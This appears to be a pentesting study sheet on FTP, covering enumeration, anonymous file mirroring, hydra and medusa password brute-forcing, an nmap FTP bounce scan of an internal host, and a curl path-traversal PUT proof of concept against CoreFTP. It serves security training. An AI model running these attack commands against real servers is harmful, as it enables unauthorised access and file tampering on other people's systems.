The File Transfer Protocol (FTP) is a standard network protocol used to transfer files between computers. It also performs directory and files operations, such as changing the working directory, listing files, and renaming and deleting directories or files. By default, FTP listens on port TCP/21.
# Enumeration
```
sudo nmap -sC -sV -p 21 192.168.2.142
```
Download all available files
```
wget -m --no-passive ftp://anonymous:anonymous@<ip>
```
the default configuration of vsFTPd can be found in `/etc/vsftpd.conf` There is a file called `/etc/ftpusers` that we also need to pay attention to, as this file is used to deny certain users access to the FTP service. 
It looks slightly different if the FTP server runs with TLS/SSL encryption. Because then we need a client that can handle TLS/SSL. For this, we can use the client `openssl` and communicate with the FTP server. The good thing about using `openssl` is that we can see the SSL certificate, which can also be helpful.
```
openssl s_client -connect 10.129.14.136:21 -starttls ftp
```
Find nmap NSE scripts for FTP:
```
find / -type f -name ftp* 2>/dev/null | grep scripts
```
FTP file transfer binary. Before you transfer any file through FTP, input the binary command within the ftp console
```
binary
```
FTP transfer Linux â†’ Windows
1. Download pyftpdlib if it is not available: `apt-get install python-pyftpdlib`
2. `python3 -m pyftpdlib -p 21 --write`
3. On your windows machine connect through ftp login anonymous and put the windows_server.c file
# FTP Attacks
## FTP Brute Force
```
Hydra -L <username list> -P <password list> ftp://IP -t 64
```
```
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp
```
## FTP Bounce Attack
An FTP bounce attack is a network attack that uses FTP servers to deliver outbound traffic to another device on the network. The attacker uses a PORT command to trick the FTP connection into running commands and getting information from a device other than the intended server. 
Consider we are targetting an FTP Server FTP_DMZ exposed to the internet. Another device within the same network, Internal_DMZ, is not exposed to the internet. We can use the connection to the FTP_DMZ server to scan Internal_DMZ using the FTP Bounce attack and obtain information about the server's open ports. Then, we can use that information as part of our attack against the infrastructure.
The Nmap -b flag can be used to perform an FTP bounce attack
```
nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
```
## Latest FTP Vulnerabilities: CoreFTP
This FTP service uses an HTTP POST request to upload files. However, the CoreFTP service allows an HTTP PUT request, which we can use to write content to files. Let's have a look at the attack based on our concept.
```
curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```
We create a raw HTTP PUT request (-X PUT) with basic auth (--basic -u <username>:<password>), the path for the file (--path-as-is https://<IP>/../../../../../whoops), and its content (--data-binary "PoC.") with this command. Additionally, we specify the host header (-H "Host: <IP>") with the IP address of our target system.